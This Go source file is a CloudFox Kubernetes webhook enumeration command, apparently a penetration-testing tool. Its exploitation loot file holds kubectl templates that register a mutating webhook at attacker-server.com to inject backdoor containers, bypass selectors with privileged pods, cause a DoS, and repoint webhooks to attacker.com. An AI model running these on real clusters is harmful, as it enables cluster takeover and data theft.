package commands

import (
	"context"
	"fmt"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/spf13/cobra"
	admissionv1 "k8s.io/api/admissionregistration/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
)

var WebhooksCmd = &cobra.Command{
	Use:     "webhooks",
	Aliases: []string{"wh"},
	Short:   "List all Mutating, Validating, and CRD conversion webhooks",
	Long: `
List all cluster webhook configurations (Mutating, Validating, CRD conversion):
  cloudfox kubernetes webhooks`,

	Run: ListWebhooks,
}

type WebhooksOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t WebhooksOutput) TableFiles() []internal.TableFile {
	return t.Table
}

func (t WebhooksOutput) LootFiles() []internal.LootFile {
	return t.Loot
}

type WebhookFinding struct {
	Type               string
	Name               string
	WebhookName        string
	Namespace          string
	Service            string
	Path               string
	IsExternal         bool
	HasCABundle        bool
	FailurePolicy      string
	TimeoutSeconds     int32
	SideEffects        string
	Operations         []string
	Resources          []string
	Scope              string
	RiskLevel          string
	RiskDescription    string
	SensitiveResources []string
}

func ListWebhooks(cmd *cobra.Command, args []string) {
	ctx := context.Background()
	logger := internal.NewLogger()

	// Extract global flags
	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating webhooks for %s", globals.ClusterName), globals.K8S_WEBHOOKS_MODULE_NAME)

	headers := []string{
		"Risk", "Type", "Name", "FailurePolicy", "Timeout", "Namespace", "Service/URL", "Scope", "Security Issues",
	}

	var findings []WebhookFinding
	var outputRows [][]string
	var lootEnum []string

	lootEnum = append(lootEnum, `#####################################
##### Enumerate Webhook Information
#####################################`)
	if globals.KubeContext != "" {
		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	// Create dynamic client once
	restCfg, err := config.GetRESTConfig()
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error getting REST config: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
		return
	}
	dynClient, err := dynamic.NewForConfig(restCfg)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error creating dynamic client: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
		return
	}

	// Helper to process webhook configurations dynamically with security analysis
	processWebhooks := func(gvr schema.GroupVersionResource, whType string) {
		list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
		if err != nil {
			logger.ErrorM(fmt.Sprintf("Error listing %s: %v", whType, err), globals.K8S_WEBHOOKS_MODULE_NAME)
			return
		}

		for _, item := range list.Items {
			webhooks, found, _ := unstructured.NestedSlice(item.Object, "webhooks")
			if !found {
				continue
			}

			cfgName, _, _ := unstructured.NestedString(item.Object, "metadata", "name")

			for _, whObj := range webhooks {
				whMap := whObj.(map[string]interface{})
				finding := WebhookFinding{
					Type: whType,
					Name: cfgName,
				}

				// Extract webhook name
				if whName, ok := whMap["name"].(string); ok {
					finding.WebhookName = whName
				}

				// Extract clientConfig
				ns := "<N/A>"
				svc := ""
				pathStr := ""
				var externalURL string
				finding.HasCABundle = false

				if clientMap, ok := whMap["clientConfig"].(map[string]interface{}); ok {
					if svcMap, ok := clientMap["service"].(map[string]interface{}); ok {
						if n, ok := svcMap["namespace"].(string); ok {
							ns = n
							finding.Namespace = n
						}
						if s, ok := svcMap["name"].(string); ok {
							svc = s
							finding.Service = s
						}
						if p, ok := svcMap["path"].(string); ok && p != "" {
							pathStr = p
							finding.Path = p
						}
					}
					if u, ok := clientMap["url"].(string); ok && u != "" {
						externalURL = u
						finding.Path = u
						finding.IsExternal = k8sinternal.IsWebhookExternalURL(u)
					}
					if cb, ok := clientMap["caBundle"].(string); ok && cb != "" {
						finding.HasCABundle = true
					}
				}

				// Extract FailurePolicy (default is Fail if not specified)
				failurePolicy := "Fail"
				if fp, ok := whMap["failurePolicy"].(string); ok {
					failurePolicy = fp
				}
				finding.FailurePolicy = failurePolicy

				// Extract TimeoutSeconds (default is 10 if not specified)
				timeoutSeconds := int32(10)
				if ts, ok := whMap["timeoutSeconds"].(int64); ok {
					timeoutSeconds = int32(ts)
				} else if ts, ok := whMap["timeoutSeconds"].(float64); ok {
					timeoutSeconds = int32(ts)
				}
				finding.TimeoutSeconds = timeoutSeconds

				// Extract SideEffects
				sideEffects := "Unknown"
				if se, ok := whMap["sideEffects"].(string); ok {
					sideEffects = se
				}
				finding.SideEffects = sideEffects

				// Extract and analyze rules
				rulesSlice, found, _ := unstructured.NestedSlice(whMap, "rules")
				var allOperations []string
				var allResources []string
				var sensitiveResources []string
				hasWildcardOps := false
				hasWildcardRes := false

				if found && len(rulesSlice) > 0 {
					for _, r := range rulesSlice {
						ruleMap := r.(map[string]interface{})
						ops, _, _ := unstructured.NestedStringSlice(ruleMap, "operations")
						resources, _, _ := unstructured.NestedStringSlice(ruleMap, "resources")

						allOperations = append(allOperations, ops...)
						allResources = append(allResources, resources...)

						if k8sinternal.HasWildcardOperations(ops) {
							hasWildcardOps = true
						}
						if k8sinternal.HasWildcardResources(resources) {
							hasWildcardRes = true
						}

						// Detect sensitive resources
						for _, res := range resources {
							if k8sinternal.IsSensitiveResource(res) && !contains(sensitiveResources, res) {
								sensitiveResources = append(sensitiveResources, res)
							}
						}
					}
				}

				finding.Operations = k8sinternal.UniqueStrings(allOperations)
				finding.Resources = k8sinternal.UniqueStrings(allResources)
				finding.SensitiveResources = sensitiveResources

				// Extract scope information (namespace/object selectors)
				scopeParts := []string{}
				if nsSelector, found, _ := unstructured.NestedMap(whMap, "namespaceSelector"); found {
					if matchLabels, ok := nsSelector["matchLabels"].(map[string]interface{}); ok && len(matchLabels) > 0 {
						scopeParts = append(scopeParts, "namespace-scoped")
					} else {
						scopeParts = append(scopeParts, "all-namespaces")
					}
				} else {
					scopeParts = append(scopeParts, "all-namespaces")
				}

				if objSelector, found, _ := unstructured.NestedMap(whMap, "objectSelector"); found {
					if matchLabels, ok := objSelector["matchLabels"].(map[string]interface{}); ok && len(matchLabels) > 0 {
						scopeParts = append(scopeParts, "label-filtered")
					}
				}
				finding.Scope = strings.Join(scopeParts, ", ")

				// Calculate risk level
				interceptsSensitive := len(sensitiveResources) > 0
				finding.RiskLevel = k8sinternal.GetWebhookRiskLevel(
					finding.IsExternal,
					finding.HasCABundle,
					hasWildcardOps,
					hasWildcardRes,
					interceptsSensitive,
					failurePolicy,
					timeoutSeconds,
				)

				// Get risk description
				finding.RiskDescription = k8sinternal.GetWebhookRiskDescription(
					finding.IsExternal,
					finding.HasCABundle,
					hasWildcardOps,
					hasWildcardRes,
					interceptsSensitive,
					failurePolicy,
					timeoutSeconds,
					sensitiveResources,
				)

				findings = append(findings, finding)

				// Build output row
				serviceOrURL := svc
				if finding.IsExternal {
					serviceOrURL = externalURL
				} else if svc == "" {
					serviceOrURL = "<N/A>"
				}

				outputRows = append(outputRows, []string{
					finding.RiskLevel,
					whType,
					cfgName,
					failurePolicy,
					fmt.Sprintf("%ds", timeoutSeconds),
					ns,
					serviceOrURL,
					finding.Scope,
					finding.RiskDescription,
				})

				// Add to loot enum
				lootEnum = append(lootEnum, "")
				lootEnum = append(lootEnum, fmt.Sprintf("# [%s] %s webhook: %s", finding.RiskLevel, whType, cfgName))
				lootEnum = append(lootEnum,
					fmt.Sprintf("kubectl get %s %s -o yaml", strings.ToLower(whType), cfgName),
					fmt.Sprintf("kubectl get %s %s -o json | jq '.webhooks[] | {name: .name, clientConfig: .clientConfig, failurePolicy: .failurePolicy, rules: .rules}'", strings.ToLower(whType), cfgName),
				)
			}
		}
	}

	// Helper function for contains check
	contains := func(slice []string, item string) bool {
		for _, s := range slice {
			if s == item {
				return true
			}
		}
		return false
	}

	// Mutating webhooks
	mutGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "mutatingwebhookconfigurations",
	}
	processWebhooks(mutGVR, "Mutating")

	// Validating webhooks
	validGVR := schema.GroupVersionResource{
		Group:    "admissionregistration.k8s.io",
		Version:  "v1",
		Resource: "validatingwebhookconfigurations",
	}
	processWebhooks(validGVR, "Validating")

	// CRD conversion webhooks
	crdGVR := schema.GroupVersionResource{
		Group:    "apiextensions.k8s.io",
		Version:  "v1",
		Resource: "customresourcedefinitions",
	}

	crdList, err := dynClient.Resource(crdGVR).List(ctx, metav1.ListOptions{})
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error listing CRDs dynamically: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
	} else {
		for _, crd := range crdList.Items {
			conversion, found, _ := unstructured.NestedMap(crd.Object, "spec", "conversion")
			if !found {
				continue
			}

			webhookCC, hasWebhook, _ := unstructured.NestedMap(conversion, "webhook", "clientConfig")
			if !hasWebhook {
				continue
			}

			finding := WebhookFinding{
				Type: "CRD Conversion",
				Name: crd.GetName(),
			}

			ns := "<N/A>"
			svc := ""
			var externalURL string
			finding.HasCABundle = false

			if svcMap, ok := webhookCC["service"].(map[string]interface{}); ok {
				if n, ok := svcMap["namespace"].(string); ok {
					ns = n
					finding.Namespace = n
				}
				if s, ok := svcMap["name"].(string); ok {
					svc = s
					finding.Service = s
				}
				if p, ok := svcMap["path"].(string); ok && p != "" {
					finding.Path = p
				}
			}
			if u, ok := webhookCC["url"].(string); ok && u != "" {
				externalURL = u
				finding.Path = u
				finding.IsExternal = k8sinternal.IsWebhookExternalURL(u)
			}
			if cb, ok := webhookCC["caBundle"].(string); ok && cb != "" {
				finding.HasCABundle = true
			}

			// CRD conversion webhooks default to Fail and 10s timeout
			finding.FailurePolicy = "Fail"
			finding.TimeoutSeconds = 10
			finding.Scope = "CRD conversion only"
			finding.Resources = []string{crd.GetName()}

			// Calculate risk level for CRD conversion
			finding.RiskLevel = k8sinternal.GetWebhookRiskLevel(
				finding.IsExternal,
				finding.HasCABundle,
				false, // No wildcard ops for CRD conversion
				false, // No wildcard resources
				false, // CRD conversion is not intercepting sensitive resources
				"Fail",
				10,
			)

			finding.RiskDescription = k8sinternal.GetWebhookRiskDescription(
				finding.IsExternal,
				finding.HasCABundle,
				false,
				false,
				false,
				"Fail",
				10,
				[]string{},
			)

			findings = append(findings, finding)

			serviceOrURL := svc
			if finding.IsExternal {
				serviceOrURL = externalURL
			} else if svc == "" {
				serviceOrURL = "<N/A>"
			}

			outputRows = append(outputRows, []string{
				finding.RiskLevel,
				"CRD Conversion",
				crd.GetName(),
				"Fail",
				"10s",
				ns,
				serviceOrURL,
				finding.Scope,
				finding.RiskDescription,
			})

			lootEnum = append(lootEnum, "")
			lootEnum = append(lootEnum, fmt.Sprintf("# [%s] CRD Conversion webhook: %s", finding.RiskLevel, crd.GetName()))
			lootEnum = append(lootEnum,
				fmt.Sprintf("kubectl get crd %s -o yaml", crd.GetName()),
				fmt.Sprintf("kubectl get crd %s -o json | jq '.spec.conversion'", crd.GetName()),
			)
		}
	}

	// Build security analysis loot file
	var lootSecurityAnalysis []string
	lootSecurityAnalysis = append(lootSecurityAnalysis, `#####################################
##### Webhook Security Analysis
#####################################
#
# Detailed security findings per webhook
# Prioritized by risk level
#
`)

	if globals.KubeContext != "" {
		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	// Group findings by risk level
	criticalFindings := []WebhookFinding{}
	highFindings := []WebhookFinding{}
	mediumFindings := []WebhookFinding{}
	lowFindings := []WebhookFinding{}

	for _, f := range findings {
		switch f.RiskLevel {
		case "CRITICAL":
			criticalFindings = append(criticalFindings, f)
		case "HIGH":
			highFindings = append(highFindings, f)
		case "MEDIUM":
			mediumFindings = append(mediumFindings, f)
		case "LOW":
			lowFindings = append(lowFindings, f)
		}
	}

	if len(criticalFindings) > 0 {
		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n## CRITICAL RISK WEBHOOKS (%d found)\n", len(criticalFindings)))
		for _, f := range criticalFindings {
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n### [CRITICAL] %s: %s", f.Type, f.Name))
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Issues: %s", f.RiskDescription))
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Service: %s (namespace: %s)", f.Service, f.Namespace))
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Operations: %v", f.Operations))
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Resources: %v", f.Resources))
			if len(f.SensitiveResources) > 0 {
				lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# SENSITIVE RESOURCES INTERCEPTED: %v", f.SensitiveResources))
			}
			lootSecurityAnalysis = append(lootSecurityAnalysis, "")
		}
	}

	if len(highFindings) > 0 {
		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n## HIGH RISK WEBHOOKS (%d found)\n", len(highFindings)))
		for _, f := range highFindings {
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n### [HIGH] %s: %s", f.Type, f.Name))
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Issues: %s", f.RiskDescription))
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Service: %s (namespace: %s)", f.Service, f.Namespace))
			if len(f.SensitiveResources) > 0 {
				lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("# Sensitive Resources: %v", f.SensitiveResources))
			}
			lootSecurityAnalysis = append(lootSecurityAnalysis, "")
		}
	}

	if len(mediumFindings) > 0 {
		lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n## MEDIUM RISK WEBHOOKS (%d found)\n", len(mediumFindings)))
		for _, f := range mediumFindings {
			lootSecurityAnalysis = append(lootSecurityAnalysis, fmt.Sprintf("\n### [MEDIUM] %s: %s - %s", f.Type, f.Name, f.RiskDescription))
		}
	}

	// Build exploitation/bypass loot file
	var lootExploitation []string
	lootExploitation = append(lootExploitation, `#####################################
##### Webhook Exploitation & Bypass
#####################################
#
# MANUAL EXECUTION REQUIRED
# Techniques for webhook exploitation and bypass
#
`)

	if globals.KubeContext != "" {
		lootExploitation = append(lootExploitation, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	lootExploitation = append(lootExploitation, `
##############################################
## 1. Deploy Malicious Webhook (CRITICAL)
##############################################
# If you can create/modify webhook configurations:

# Deploy malicious mutating webhook to inject backdoor containers
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: malicious-webhook
webhooks:
- name: inject.malicious.com
  clientConfig:
    url: https://attacker-server.com/mutate
    caBundle: <base64-encoded-ca>
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore
EOF

# This webhook can:
# - Inject sidecar containers into all pods
# - Modify environment variables to inject credentials
# - Add privileged security contexts
# - Mount host paths into containers

##############################################
## 2. Webhook Bypass via Namespace Selector
##############################################
# Many webhooks use namespaceSelector to scope their rules
# Find webhooks with namespace selectors:
kubectl get mutatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].namespaceSelector != null) | {name: .metadata.name, selector: .webhooks[].namespaceSelector}'
kubectl get validatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].namespaceSelector != null) | {name: .metadata.name, selector: .webhooks[].namespaceSelector}'

# Create namespace that bypasses webhook
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Namespace
metadata:
  name: bypass-namespace
  labels:
    webhook-bypass: "true"
EOF

# Deploy privileged workloads in bypass namespace
kubectl run privileged-pod -n bypass-namespace --image=alpine --restart=Never --rm -it -- sh

##############################################
## 3. Webhook Bypass via Object Selector
##############################################
# Find webhooks with object selectors:
kubectl get mutatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].objectSelector != null) | {name: .metadata.name, selector: .webhooks[].objectSelector}'

# Deploy resources with labels that bypass selectors
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: bypass-pod
  labels:
    webhook-skip: "true"
spec:
  containers:
  - name: pwn
    image: alpine
    securityContext:
      privileged: true
EOF

##############################################
## 4. Webhook DOS Attack
##############################################
# If webhook has Fail policy and long timeout, you can DOS the API server

# Find webhooks with Fail policy:
kubectl get mutatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].failurePolicy == "Fail") | {name: .metadata.name, timeout: .webhooks[].timeoutSeconds}'
kubectl get validatingwebhookconfigurations -o json | jq '.items[] | select(.webhooks[].failurePolicy == "Fail") | {name: .metadata.name, timeout: .webhooks[].timeoutSeconds}'

# If webhook service is unreachable or slow, API server will block all matching requests
# Attack: Make webhook service unavailable or very slow
# 1. Delete webhook service (if you have permissions)
kubectl delete svc <webhook-service> -n <namespace>

# 2. Network policy to block webhook traffic
cat <<EOF | kubectl apply -f -
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: block-webhook
  namespace: <webhook-namespace>
spec:
  podSelector:
    matchLabels:
      app: <webhook-pod-label>
  policyTypes:
  - Ingress
  ingress: []
EOF

##############################################
## 5. External Webhook Interception
##############################################
# If webhook uses external URL, you can intercept/exfiltrate data

# Find external webhooks:
`)

	for _, f := range findings {
		if f.IsExternal {
			lootExploitation = append(lootExploitation, fmt.Sprintf("# [%s] %s: %s -> %s", f.RiskLevel, f.Type, f.Name, f.Path))
		}
	}

	lootExploitation = append(lootExploitation, `
# If you control DNS or network:
# - Redirect webhook URL to attacker server
# - Capture all admission review requests (contains full resource specs)
# - Exfiltrate secrets, credentials, and sensitive data from pod specs

##############################################
## 6. Modify Webhook Configuration
##############################################
# If you can update webhook configs, you can:

# 1. Change failurePolicy to Ignore (bypass security checks)
kubectl patch mutatingwebhookconfiguration <webhook-name> -p '{"webhooks":[{"name":"<webhook-name>","failurePolicy":"Ignore"}]}'
kubectl patch validatingwebhookconfiguration <webhook-name> -p '{"webhooks":[{"name":"<webhook-name>","failurePolicy":"Ignore"}]}'

# 2. Remove or modify rules to bypass webhook
kubectl patch mutatingwebhookconfiguration <webhook-name> --type json -p='[{"op": "remove", "path": "/webhooks/0/rules"}]'

# 3. Change clientConfig to point to attacker server
kubectl patch mutatingwebhookconfiguration <webhook-name> --type json -p='[{"op": "replace", "path": "/webhooks/0/clientConfig/url", "value": "https://attacker.com/webhook"}]'

##############################################
## 7. Test Webhook Reachability
##############################################
# Test if you can reach webhook services from within cluster:
`)

	for _, f := range findings {
		if f.Service != "" && !f.IsExternal {
			lootExploitation = append(lootExploitation, fmt.Sprintf("\n# Test: %s/%s", f.Namespace, f.Service))
			lootExploitation = append(lootExploitation, fmt.Sprintf("kubectl run curl-test --image=curlimages/curl --rm -it --restart=Never -- curl -v -k https://%s.%s.svc%s", f.Service, f.Namespace, f.Path))
		}
	}

	lootExploitation = append(lootExploitation, `

##############################################
## 8. Certificate Analysis
##############################################
# Analyze webhook certificates for weaknesses:
`)

	for _, f := range findings {
		if f.HasCABundle {
			lootExploitation = append(lootExploitation, fmt.Sprintf("\n# Extract and analyze CA bundle for: %s", f.Name))
			lootExploitation = append(lootExploitation, fmt.Sprintf("kubectl get %s %s -o jsonpath='{.webhooks[0].clientConfig.caBundle}' | base64 -d | openssl x509 -text -noout", strings.ToLower(f.Type+"webhookconfigurations"), f.Name))
		}
	}

	lootExploitation = append(lootExploitation, "\n")

	// Build service validation loot file
	var lootServiceValidation []string
	lootServiceValidation = append(lootServiceValidation, `#####################################
##### Webhook Service Validation
#####################################
#
# Cross-reference webhooks with actual services
# Detect dangling webhooks
#
`)

	if globals.KubeContext != "" {
		lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
	}

	// Get all services for validation
	clientset := config.GetClientOrExit()
	for _, f := range findings {
		if f.Service != "" && f.Namespace != "" && f.Namespace != "<N/A>" {
			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("\n# Webhook: %s (%s)", f.Name, f.Type))
			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("# Expected Service: %s/%s", f.Namespace, f.Service))
			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get svc %s -n %s", f.Service, f.Namespace))
			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get endpoints %s -n %s", f.Service, f.Namespace))
			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("# Check if pods are running:"))
			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get pods -n %s -l <service-selector>", f.Namespace))
			lootServiceValidation = append(lootServiceValidation, "")
		}
	}

	lootServiceValidation = append(lootServiceValidation, `
# Detect dangling webhooks (service doesn't exist):
# These can cause API server instability or DOS

# Check all webhook services:
`)

	for _, f := range findings {
		if f.Service != "" && f.Namespace != "" && f.Namespace != "<N/A>" {
			lootServiceValidation = append(lootServiceValidation, fmt.Sprintf("kubectl get svc %s -n %s 2>&1 | grep -q 'NotFound' && echo 'DANGLING: %s/%s'", f.Service, f.Namespace, f.Name, f.Service))
		}
	}

	// Prepare output
	table := internal.TableFile{
		Name:   "Webhooks",
		Header: headers,
		Body:   outputRows,
	}

	lootFiles := []internal.LootFile{
		{
			Name:     "Webhook-Enum",
			Contents: strings.Join(lootEnum, "\n"),
		},
		{
			Name:     "Webhook-Security-Analysis",
			Contents: strings.Join(lootSecurityAnalysis, "\n"),
		},
		{
			Name:     "Webhook-Exploitation-Bypass",
			Contents: strings.Join(lootExploitation, "\n"),
		},
		{
			Name:     "Webhook-Service-Validation",
			Contents: strings.Join(lootServiceValidation, "\n"),
		},
	}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"Webhooks",
		globals.ClusterName,
		"results",
		WebhooksOutput{
			Table: []internal.TableFile{table},
			Loot:  lootFiles,
		},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_WEBHOOKS_MODULE_NAME)
		return
	}

	if len(outputRows) > 0 {
		criticalCount := len(criticalFindings)
		highCount := len(highFindings)
		if criticalCount > 0 || highCount > 0 {
			logger.InfoM(fmt.Sprintf("%d webhooks found (%d CRITICAL, %d HIGH risk)", len(outputRows), criticalCount, highCount), globals.K8S_WEBHOOKS_MODULE_NAME)
		} else {
			logger.InfoM(fmt.Sprintf("%d webhooks found", len(outputRows)), globals.K8S_WEBHOOKS_MODULE_NAME)
		}
	} else {
		logger.InfoM("No webhooks found, skipping output file creation", globals.K8S_WEBHOOKS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_WEBHOOKS_MODULE_NAME), globals.K8S_WEBHOOKS_MODULE_NAME)
}

// helper to stringify rules
func webhookRulesToString(rules []admissionv1.RuleWithOperations) string {
	if len(rules) == 0 {
		return "<none>"
	}
	var sb []string
	for _, r := range rules {
		sb = append(sb, fmt.Sprintf("%v %v", r.Operations, r.Resources))
	}
	return strings.Join(sb, "; ")
}
